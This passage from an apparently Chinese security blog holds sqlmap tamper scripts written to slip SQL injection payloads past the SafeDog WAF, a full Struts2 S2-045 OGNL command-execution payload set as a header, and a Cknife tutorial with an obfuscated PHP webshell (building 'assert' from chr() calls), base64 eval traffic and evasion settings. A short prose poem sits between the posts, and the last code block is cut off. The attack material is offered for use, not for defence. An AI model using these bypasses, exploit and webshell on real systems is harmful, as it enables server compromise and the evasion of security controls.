<span class="n">__priority__</span> <span class="o">=</span> <span class="n">PRIORITY</span><span class="o">.</span><span class="n">LOW</span> <span class="c"># 当前脚本调用优先等级</span>

<span class="k">def</span> <span class="nf">dependencies</span><span class="p">():</span> <span class="c"># 声明当前脚本适用/不适用的范围，可以为空。</span>
    <span class="k">pass</span>

<span class="k">def</span> <span class="nf">tamper</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span> <span class="c"># 用于篡改Payload、以及请求头的主要函数</span>
    <span class="k">return</span> <span class="n">payload</span>
</code></pre></div></div>

今天主要来讲tamper这个函数，总共两个参数。

<code class="highlighter-rouge">payload</code>主要是传递过来的是每个检测SQL注入的Payload，建议读者先找一个注入点测试并添加上<code class="highlighter-rouge">-v 3</code>参数，查看Payload体验一下。

<blockquote>
  SQL Injection:http://192.168.1.149/sqli/example1.php?name=root
</blockquote>

部分日志：

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[14:00:27] [PAYLOAD] 5444
[14:00:27] [DEBUG] setting match ratio for current parameter to 0.859
[14:00:27] [INFO] confirming that GET parameter 'name' is dynamic
[14:00:27] [PAYLOAD] 6230
[14:00:27] [INFO] GET parameter 'name' is dynamic
[14:00:27] [PAYLOAD] root),)."")','
[14:00:27] [WARNING] heuristic (basic) test shows that GET parameter 'name' might not be injectable
[14:00:27] [PAYLOAD] root'jQBnEm&lt;'"&gt;IXWAcV
[14:00:27] [INFO] testing for SQL injection on GET parameter 'name'
[14:00:28] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:00:28] [PAYLOAD] root) AND 1494=5040 AND (7286=7286
[14:00:28] [DEBUG] setting match ratio for current parameter to 0.859
[14:00:28] [PAYLOAD] root) AND 6033=6033 AND (6260=6260
[14:00:28] [PAYLOAD] root AND 9786=3346
[14:00:28] [DEBUG] setting match ratio for current parameter to 0.859
[14:00:28] [PAYLOAD] root AND 6033=6033
[14:00:28] [PAYLOAD] root') AND 7485=8545 AND ('IUCd'='IUCd
[14:00:28] [DEBUG] setting match ratio for current parameter to 0.634
[14:00:28] [PAYLOAD] root') AND 6033=6033 AND ('qlLE'='qlLE
[14:00:28] [PAYLOAD] root' AND 5621=6946 AND 'OKld'='OKld
[14:00:28] [DEBUG] setting match ratio for current parameter to 0.859
[14:00:28] [PAYLOAD] root' AND 6033=6033 AND 'HFDv'='HFDv
[14:00:28] [PAYLOAD] root' AND 9642=7321 AND 'reXb'='reXb
</code></pre></div></div>
我们此时站在自动化检测工具的角度去分析这个注入点

首先判断这个参数的值是整数型还是字符型，因为在数据库中，要进行条件匹配、逻辑运算的话，字符是要被双引号包裹起来的，而整数不用。

<h3 id="example">Example：</h3>
<blockquote>
  SELECT * FROM user WHERE username = ‘root’
SELECT * FROM user WHERE uid = 1
SELECT * FROM user WHERE uid =’1’ # 数字字符遇到整数型字段会被自动转换
</blockquote>

再看这一条：<code class="highlighter-rouge">[14:00:28] [PAYLOAD] root' AND 6033=6033 AND 'HFDv'='HFDv</code>，此时已经完全符合我们的要求了。
SQL语句如下：<code class="highlighter-rouge">SELECT * FROM user WHERE username='root' AND 6033=6033 AND 'HFDv'='HFDv'</code>

<blockquote>
  如果还不理解，你就要去看手工注入的知识了，没必要再向下阅读了。
</blockquote>

<h2 id="0x03-tamper的几个玩法">0x03 Tamper的几个玩法</h2>

到了重头戏了，我们来自己写几个Tamper，然后去分析我之前写过的Tamper，还是很好理解的！

本文中涉及的技术并没有多么深，你只需要有手工注入的基础、Python的字符串简单操作即可写出自己的Tamper。

首先举个例子，假设我们有一个加工厂，这个加工厂的产品需要经过三个流程，<code class="highlighter-rouge">进货</code>、<code class="highlighter-rouge">加工</code>、<code class="highlighter-rouge">包装</code>、<code class="highlighter-rouge">出售</code>。但是我们的货物我们不需要去包装就可以直接出售给客户。

<blockquote>
  这里的货物就是我们的SQL注入点，你可以把它当作一个向服务器端发送的请求。
</blockquote>

<blockquote>
  这个进货的操作就是我们将检测目标传递给自动化注入工具的过程了。
</blockquote>

<blockquote>
  加工就是自动化注入工具进行分析、构造合适的Payload。
</blockquote>

<blockquote>
  假设这个货物要被包装才可以出售(调用了 –tamper参数)，那么我们的加工材料(Payload)就会经过我们的包装车间(tamper函数),为了兼容不同的产品，所以根据产品的个数设立了可变的车间(payload参数和**kwargs参数)。
</blockquote>

<blockquote>
  最后的出售就是将加工好的产品(请求)卖给客户(存在注入点的服务器)。
</blockquote>

整个tamper的作用就在这里，用于判断是否需要包装。

下面我根据刚才这个例子来写一个简单的包装车间(tamper)：
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>

<span class="s">"""
Copyright (c) 2006-2016 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""</span>

<span class="kn">from</span> <span class="nn">lib.core.enums</span> <span class="kn">import</span> <span class="n">PRIORITY</span>

<span class="n">__priority__</span> <span class="o">=</span> <span class="n">PRIORITY</span><span class="o">.</span><span class="n">LOW</span>

<span class="k">def</span> <span class="nf">dependencies</span><span class="p">():</span>
    <span class="k">pass</span>

<span class="k">def</span> <span class="nf">tamper</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span><span class="c"># tamper函数体内你可以把payload和kwargs当作已经传递进来的值</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">" "</span><span class="p">,</span><span class="s">"/**/"</span><span class="p">)</span> <span class="c"># 将空格替换为/**/</span>
    <span class="k">print</span> <span class="n">payload</span> <span class="c">#适当的还可以直接输出，不使用-v参数了。</span>
    <span class="k">return</span> <span class="n">payload</span> <span class="c">#必须返回最后的Payload</span>
</code></pre></div></div>
我们将上面的代码保存为tamperdeomo.py放到sqlmap的tamper目录中。
然后试着调用这个脚本
<blockquote>
  sqlmap -u http://192.168.1.149/sqli/example1.php?name=root –tamper=tamperdemo
</blockquote>

是不是很简单呢？

我们的第一个Tamper就大功告成了，可惜的是sqlmap官方提供的tamper中已经有了我们刚才写的功能，并且WAF大多没有那么低的level。

想要提升我们tamper的杀伤力和Level，首先你要了解Http相关的基础知识，以及正则表达式。

总之万变不离其宗，我们只要在最后返回Payload的值就可以了。

另一种玩法就是将我们请求的Header头进行一下篡改：
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>

<span class="s">"""
Copyright (c) 2006-2016 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""</span>

<span class="kn">from</span> <span class="nn">lib.core.enums</span> <span class="kn">import</span> <span class="n">PRIORITY</span>

<span class="n">__priority__</span> <span class="o">=</span> <span class="n">PRIORITY</span><span class="o">.</span><span class="n">LOW</span>

<span class="k">def</span> <span class="nf">dependencies</span><span class="p">():</span>
    <span class="k">pass</span>

<span class="k">def</span> <span class="nf">tamper</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
    <span class="n">kwargs</span><span class="p">[</span><span class="s">'headers'</span><span class="p">][</span><span class="s">'X-Forwarded-For'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'10.10.10.10'</span> <span class="c"># 这里的kwargs是一个字典，读者可以直接print打印出来看看结构。</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">" "</span><span class="p">,</span><span class="s">'/**/'</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">payload</span>
</code></pre></div></div>

经常看HTTP数据包的读者肯定注意到了，kwargs[‘headers’]对应我们的请求Header头，它是一个字典。

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">kwargs</span><span class="p">[</span><span class="s">'headers'</span><span class="p">][</span><span class="s">'Content-type'</span><span class="p">]</span> <span class="o">=</span> <span class="s">"</span><span class="si">%</span><span class="s">{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"</span><span class="o">+</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">+</span><span class="s">"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"</span>

<span class="n">kwargs</span><span class="p">[</span><span class="s">'headers'</span><span class="p">][</span><span class="s">'User-Agent'</span><span class="p">]</span><span class="o">=</span><span class="s">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"</span> <span class="c"># 修改User-Agent</span>
</code></pre></div></div>

也可以这么来执行<code class="highlighter-rouge">S2-045</code>……

当然也可以<code class="highlighter-rouge">import</code>其他模块进行操作，随心所欲 ～

下面分析我之前分享出来的两个bypass脚本：

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>
<span class="kn">from</span> <span class="nn">lib.core.enums</span> <span class="kn">import</span> <span class="n">PRIORITY</span>
<span class="n">__priority__</span> <span class="o">=</span> <span class="n">PRIORITY</span><span class="o">.</span><span class="n">LOW</span>

<span class="k">def</span> <span class="nf">tamper</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span><span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">payload</span><span class="p">:</span>
		<span class="n">bypass_SafeDog_str</span> <span class="o">=</span> <span class="s">"/*x^x*/"</span> <span class="c"># 一个干扰字符</span>
		<span class="n">payload</span><span class="o">=</span><span class="n">payload</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"UNION"</span><span class="p">,</span><span class="n">bypass_SafeDog_str</span><span class="o">+</span><span class="s">"UNION"</span><span class="o">+</span><span class="n">bypass_SafeDog_str</span><span class="p">)</span> <span class="c"># 在UNION的左右两边添加干扰字符</span>
		<span class="n">payload</span><span class="o">=</span><span class="n">payload</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"SELECT"</span><span class="p">,</span><span class="n">bypass_SafeDog_str</span><span class="o">+</span><span class="s">"SELECT"</span><span class="o">+</span><span class="n">bypass_SafeDog_str</span><span class="p">)</span> <span class="c"># 同上，</span>
		<span class="n">payload</span><span class="o">=</span><span class="n">payload</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"AND"</span><span class="p">,</span><span class="n">bypass_SafeDog_str</span><span class="o">+</span><span class="s">"AND"</span><span class="o">+</span><span class="n">bypass_SafeDog_str</span><span class="p">)</span> <span class="c"># 同上，</span>
		<span class="n">payload</span><span class="o">=</span><span class="n">payload</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"="</span><span class="p">,</span><span class="n">bypass_SafeDog_str</span><span class="o">+</span><span class="s">"="</span><span class="o">+</span><span class="n">bypass_SafeDog_str</span><span class="p">)</span> <span class="c"># 将空格替换成干扰字符</span>
		<span class="n">payload</span><span class="o">=</span><span class="n">payload</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">" "</span><span class="p">,</span><span class="n">bypass_SafeDog_str</span><span class="p">)</span>
		<span class="n">payload</span><span class="o">=</span><span class="n">payload</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"information_schema."</span><span class="p">,</span><span class="s">"</span><span class="si">%20%20</span><span class="s">/*!</span><span class="si">%20%20%20%20</span><span class="s">INFOrMATION_SCHEMa</span><span class="si">%20%20%20%20</span><span class="s">*/</span><span class="si">%20%20</span><span class="s">/*^x^^x^*/</span><span class="si">%20</span><span class="s">/*!.*/</span><span class="si">%20</span><span class="s">/*^x^^x^*/"</span><span class="p">)</span> <span class="c"># 将information_schema.这个关键字替换成URL编码后的内容</span>
		<span class="n">payload</span><span class="o">=</span><span class="n">payload</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"FROM"</span><span class="p">,</span><span class="n">bypass_SafeDog_str</span><span class="o">+</span><span class="s">"FROM"</span><span class="o">+</span><span class="n">bypass_SafeDog_str</span><span class="p">)</span> <span class="c"># 同样替换</span>
		<span class="c">#print "[+]THE PAYLOAD RUNNING...Bypass safe dog 4.0 apache version ."</span>
		<span class="k">print</span> <span class="n">payload</span> <span class="c"># 输出Payload </span>
    <span class="k">return</span> <span class="n">payload</span> <span class="c"># 返回Payload</span>
</code></pre></div></div>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="c">#!/usr/bin/env python</span>
<span class="kn">import</span> <span class="nn">re</span>
<span class="kn">from</span> <span class="nn">lib.core.enums</span> <span class="kn">import</span> <span class="n">PRIORITY</span>
<span class="n">__priority__</span> <span class="o">=</span> <span class="n">PRIORITY</span><span class="o">.</span><span class="n">LOW</span>
<span class="k">def</span> <span class="nf">tamper</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">payload</span><span class="p">:</span>
              <span class="k">pass</span>
              <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"SLEEP(5)"</span><span class="p">,</span><span class="s">"</span><span class="se">\"</span><span class="s">0</span><span class="se">\"</span><span class="s"> LikE Sleep(5)"</span><span class="p">)</span> <span class="c"># 将SLEEP(5)替换成"0" LIKE Sleep(5)，因为Sleep()函数执行后会返回0，0等于0就会返回true</span>
       	      <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">""</span><span class="p">,</span><span class="s">"/*FFFFFFFFFFFFFFFFFFFFFFFFF*/"</span><span class="p">)</span> <span class="c"># 将空格替换</span>
              <span class="n">p</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="nb">compile</span><span class="p">(</span><span class="s">r'(\d+)='</span><span class="p">)</span>
              <span class="n">payload</span><span class="o">=</span><span class="n">p</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="s">r"'\1'LikE "</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span> <span class="c">#将数字附近的=替换成LikE</span>
    <span class="k">return</span> <span class="n">payload</span> <span class="c"># 返回payload</span>
</code></pre></div></div>

<h2 id="0x04-最后的吐槽">0x04 最后的吐槽！</h2>

看了这么多例子，你是否有所收获呢？

因为在某社区看到有人高价出售tamper、过狗一句话……讲真，我看不起这种行为。

在挖掘防护产品有缺陷的时候请不要感觉自己多么厉害，也许是运气、偶然、实力。

不管以任何方式，都不能忘记初心。

每一个漏洞的公布，都会给这个时代的技术发展画上浓重的一笔。

再此，感谢云锁、安全狗在职的朋友们的鼓励与支持。


    </div>
    <div class="posted">
      posted on
      <span class="posted-on">

        Thursday, June 8, 2017
      </span>
      <span class="in">
        in
      </span>
      <span class="categories-on">
        
        bypass &nbsp;,
        
        sqlmap &nbsp;,
        
        tamper &nbsp;
        
      </span>
    </div>
  </div>
  
  <div class="post-box">
    <div class="post-title">
    <a class="post-title" href="/archivers/2017-06-08/2" > 光阴是酒，醉了来人</a>
    </div>
    <div class="post-excerpt">
      这首诗，两年了，读起来还是那么的有味道。
<!--more-->
　　季节一茬茬地来了又去了，像人，一批批地走来，又一批批地融化。时间的水，冲刷春夏秋冬，阳春白雪，也让许多人的影子沉溺消逝。尽管寒来暑往是一种经难，而人，也还是在出世入世间醉了自己，醉了时空。

　　是谁把光阴酿成了甘醇，一滴酒里就论了乾坤。点点清亮的水液，容纳了大唐的雄风，装进了汉王的豪气。究竟是时光醉了人，还是人醉了时光。

　　日子不等人，不管你是柴禾背夫，还是皇室王子，气数的极限就等候在眼前，无论你看见还是看见，抑或装作没看见，它都有足够的耐心蹲守在那里。孟婆碗里的汤，从不分高贵与贫贱，人生命的季节末端，总有奈何桥上大一统的公平与平等。

　　那是一座怎样美妙的彩虹桥啊！谁走在上面，都是天堂的等待。因为这里废弃了等级观念，人人都是光阴酒缸里的裸浴者。王冠和草帽一样的散香，赤裸的身躯同样的云中飞，雾中驰。

　　在世上，人人都想活出个光彩照人，个个都拼出老命也要把红尘间的锦囊扑抓。本想优雅转身时，却撞上了华丽的黑暗。

　　时光把四季熏得年年旋，月月转，怎么也跨不出春花秋果的轮回圈。人是日子的背包，让年月一遍遍地装入，随着岁数的递增，包底的沉重一次次地拖压，终成漏兜的一个滴落。

　　小时候，总盼望着花儿快快的开，把轻快的脚步向往成光阴里的一枚枚敬拜。于是，对着月下星空，遥想长大后的种种美好。那时，一秒钟的憧憬，就温暖了几个世纪的来生。

　　日落日升不醉人，人自醉。一落入尘埃，黎明的第一缕曙光，就是一坛迷人的酒，你饮与不饮，由不得心的首造。

　　时辰很慈悲，从不索求什么。只要人一落世，对谁都平等相待。

　　锦上添花是人的本性嗜好，在苦难中挣扎的生命需要手的救援，但常常碰到的是袖手旁观的姿势。黑色的脚印墨化了人性的良善，而狼性的生吞活剥在人世得到了最大程度的释放。生存中，人学会了残暴，冷酷，狞笑，势利，三五九等成为惯常的衡量思维，祭祀的飘带上，有神的遗嘱在猎猎飞扬。

　　人时常赞美大自然的公正，岂不知，自然界是一个最没有情商的怪物，它和政治的心律一样，只跳荡在适者生存的理念上。一条生物链，把弱肉强食的经转念到了地老天荒。

　　一代豪杰，总想活出个千年黑，万年白，炼丹炉里的熊熊火光，忽闪出嘲讽的烈焰，映红了永世不泯的野心。世事不会有尽头，而人总想扒住时光的岩石，做一朵永不凋谢的石茶花。

　　宇宙间，除了时间是不可争论的公平君子外，一切皆是虚晃的游戏。所有主义的，只能代表政治的某种主张，不能代替文化。政治的潜规则，是人玩出来的。文化是酿酒师，把人酿成了哲学。

　　易经，是物质运行轨迹的学说；佛学，是因果的学说。人神共舞，这个世界因此精彩无限。在世上，人人都想当主角，生活中，实则大部分都只能是配角。

　　芸芸众生是现实的本来面目，众多星星里一盘月亮才是合乎天规的所在。人想通了，则一通百通。闷头曳犁的牛，常常会在收割的季节里咀嚼出生命最本真的滋味。

　　一枚草叶的清香，就到达了幸福的彼岸。

　　境界是文化的酒香，悲剧是历史的命题。回光返照让一个时代疯狂得烫手，谁在持念一把剑的血刃上，玷污了一个民族的良知。

　　等候的灯盏照不出人前行后尘的路，官僚阶级的产生，让众生瞠目结舌。于是，畸形的意识腐蚀了经世的流年。世界不变的规律就是不停地在变，海不会枯，石不会烂，只有人的誓言才会在利己的环境下溃散如沙。

　　在排除异己，消除后患的现实面前，翻寻先人业力里的残忍，使人返祖的记忆呈现一派黑色瑰丽，亮了自己的眼，暗了神坛上的的灯。

　　尘垢在肉身上结成了一件厚厚的外衣，人活不出自我，就被沉重的衣服拖向黑夜的深渊里。思想的灾难导致凡俗间的不了情，为求得一地生存，早已忘却了天堂和地狱两扇迥异的门。

　　斟一杯时光的酒，你来我往的路上，皆是醉汉，踉跄的身影，婀娜的梦想，飘逸出岁月的醇香。

　　尘世一缘，相遇相逢，你在我的眼里，我在你的眸上，光阴的酒豪迈了来者的醉意，盘腿一坐，便嗅出了年轮的禅味……

    </div>
    <div class="posted">
      posted on
      <span class="posted-on">

        Thursday, June 8, 2017
      </span>
      <span class="in">
        in
      </span>
      <span class="categories-on">
        
        poetry &nbsp;
        
      </span>
    </div>
  </div>
  
  <div class="post-box">
    <div class="post-title">
    <a class="post-title" href="/archivers/2017-06-05/1" > Cknife Bypass WAF</a>
    </div>
    <div class="post-excerpt">
      本文简述一下配置CKnife达到bypass软WAF的实例
<!--more-->
<h2 id="0x00-前言">0x00 前言</h2>

这篇文章之前写过，由于博客关闭，重写一遍。

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，本博主不为此承担任何责任。

<blockquote>
  主要思路就是讲工具传输的内容加密，绕过WAF的匹配。
</blockquote>

所需要的环境：

<ul>
  <li>Windows Server 2003</li>
  <li>Safe dog 4.0 正式版</li>
  <li>CKnife 1.0 Release</li>
  <li>BurpSuite 1.6</li>
  <li>ByPass 一句话木马一枚</li>
</ul>

Bypass Shell 具体可以点击这里寻找：<a href="https://code.csdn.net/payloads/webshell/tree/master/PHP/20170526_bypass">Bypass Shell</a>

<code class="highlighter-rouge">Shell Code</code> 如下：

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nv">$___Ss</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">((</span><span class="mi">97</span> <span class="o">^</span> <span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>  <span class="c1">//[a]</span>
<span class="nv">$___Ss</span> <span class="o">.=</span><span class="nb">chr</span><span class="p">((</span><span class="mi">115</span> <span class="o">^</span> <span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span> <span class="c1">//[s]</span>
<span class="nv">$___Ss</span> <span class="o">.=</span><span class="nb">chr</span><span class="p">((</span><span class="mi">115</span> <span class="o">^</span> <span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span> <span class="c1">//[s]</span>
<span class="nv">$___Ss</span> <span class="o">.=</span><span class="nb">chr</span><span class="p">((</span><span class="mi">101</span> <span class="o">^</span> <span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span> <span class="c1">//[e]</span>
<span class="nv">$___Ss</span> <span class="o">.=</span><span class="nb">chr</span><span class="p">((</span><span class="mi">114</span> <span class="o">^</span> <span class="mi">0</span><span class="p">));</span> <span class="c1">//[r]</span>
<span class="nv">$___Ss</span> <span class="o">.=</span><span class="nb">chr</span><span class="p">((</span><span class="mi">116</span> <span class="o">^</span> <span class="mi">0</span><span class="p">));</span> <span class="c1">//[t]</span>
<span class="nv">$___Ss</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]);</span>
</code></pre></div></div>

<h2 id="0x01-普通传输模式分析">0x01 普通传输模式分析</h2>

首先我们在WAF开启的情况下直接连接：

<img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-06-05/0x00.png" alt="添加Shell" />

接着为了方便分析，我们为当前条目添加上一个代理，通过<code class="highlighter-rouge">Burp</code>来分析与服务器端木马的交互数据。

<img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-06-05/0x01.png" alt="添加代理" />

双击进行连接后，数据包到了我们的Burp中：

<img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-06-05/0x02.png" alt="分析数据" />

可以看到已经被<code class="highlighter-rouge">WAF</code>拦截了：

<img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-06-05/0x03.png" alt="拦截截图" />

那么我们深知，手工的话是不会被拦截的，为什么呢？

手工截图：

<img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-06-05/0x05.png" alt="手工" />

<h2 id="0x02-站在waf的角度考虑">0x02 站在WAF的角度考虑</h2>

先来看看数据包：

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /3.php HTTP/1.1
User-Agent: Java/1.8.0_131
Host: 192.168.1.103
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Proxy-Connection: keep-alive
Content-type: application/x-www-form-urlencoded
Content-Length: 680

username=@eval(base64_decode($_POST[action]));&amp;action=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJbIlBBVEhfVFJBTlNMQVRFRCJdKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7cHJpbnQgJFI7O2VjaG8oInw8LSIpO2RpZSgpOw%3D%3D
</code></pre></div></div>

分析出以下几点可疑行为：
<ul>
  <li>首先普通用户的UserAgent肯定是常见的终端标识，那么数据包中的<code class="highlighter-rouge">User-Agent</code>就可能成为WAF的拦截对象</li>
  <li>username参数的值非常可疑，因为有<code class="highlighter-rouge">eval</code>、<code class="highlighter-rouge">base64_decode</code>、<code class="highlighter-rouge">$_POST</code>等标识。</li>
</ul>

随之我们根据<code class="highlighter-rouge">Shell Code</code>与<code class="highlighter-rouge">数据包</code>来分析代码的执行流程：

当我们的<code class="highlighter-rouge">username=@eval(base64_decode($_POST[action]));</code>传给服务器后，又开辟了一个参数再传递给<code class="highlighter-rouge">eval</code>，在我们看来都是多此一举的，我们只要直接把数据传递给<code class="highlighter-rouge">username</code>即可。

我在此没有发现能够更改这种传输方式，没有去看源码。

最终我通过了另一种方式去更改传递数据。

<h2 id="0x03-just-do-it">0x03 Just Do it</h2>

先看看Cknife的配置文件<code class="highlighter-rouge">Config.ini</code>说明：

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PARAM1=z1         			       参数1 
PARAM2=z2         			       参数2 
PHP_BASE64=1   				       当为PHP时，Z1，Z2参数是否开启自动base64加密，如果想定义自己的加密方式则关闭设置为0 
PHP_MAKE=@eval(base64_decode($_POST[action])); 生成方式，这里可以不用该方式，可以用你任何想要的方式 
</code></pre></div></div>
最关键的就是<code class="highlighter-rouge">PHP_MAKE</code>参数了，我们将其改成base64编码后的结果。

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PHP_BASE64=1
PHP_MAKE=ZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFthY3Rpb25dKSk\=
</code></pre></div></div>
这里多了一个<code class="highlighter-rouge">\</code>，是jar程序自己转码的。读者可以将此<code class="highlighter-rouge">code</code>去<code class="highlighter-rouge">base64_decode</code>一下，看看是不是 <code class="highlighter-rouge">@eval(base64_decode($_POST[action]));</code>

那么此时是否真的能够Bypass呢？

NO NO NO，因为我们的Shell Code并没有解码功能。

更改后如下：

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nv">$___Ss</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">((</span><span class="mi">97</span> <span class="o">^</span> <span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>  <span class="c1">//[a]</span>
<span class="nv">$___Ss</span> <span class="o">.=</span><span class="nb">chr</span><span class="p">((</span><span class="mi">115</span> <span class="o">^</span> <span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span> <span class="c1">//[s]</span>
<span class="nv">$___Ss</span> <span class="o">.=</span><span class="nb">chr</span><span class="p">((</span><span class="mi">115</span> <span class="o">^</span> <span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span> <span class="c1">//[s]</span>
<span class="nv">$___Ss</span> <span class="o">.=</span><span class="nb">chr</span><span class="p">((</span><span class="mi">101</span> <span class="o">^</span> <span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span> <span class="c1">//[e]</span>
<span class="nv">$___Ss</span> <span class="o">.=</span><span class="nb">chr</span><span class="p">((</span><span class="mi">114</span> <span class="o">^</span> <span class="mi">0</span><span class="p">));</span> <span class="c1">//[r]</span>
<span class="nv">$___Ss</span> <span class="o">.=</span><span class="nb">chr</span><span class="p">((</span><span class="mi">116</span> <span class="o">^</span> <span class="mi">0</span><span class="p">));</span> <span class="c1">//[t]</span>
<span class="nv">$___Ss</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]));</span>
</code></pre></div></div>

传递过去后在服务器端其实运行的代码可以这么理解为：
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nv">$___Ss</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">((</span><span class="mi">97</span> <span class="o">^</span> <span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>  <span class="c1">//[a]</span>
<span class="nv">$___Ss</span> <span class="o">.=</span><span class="nb">chr</span><span class="p">((</span><span class="mi">115</span> <span class="o">^</span> <span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span> <span class="c1">//[s]</span>
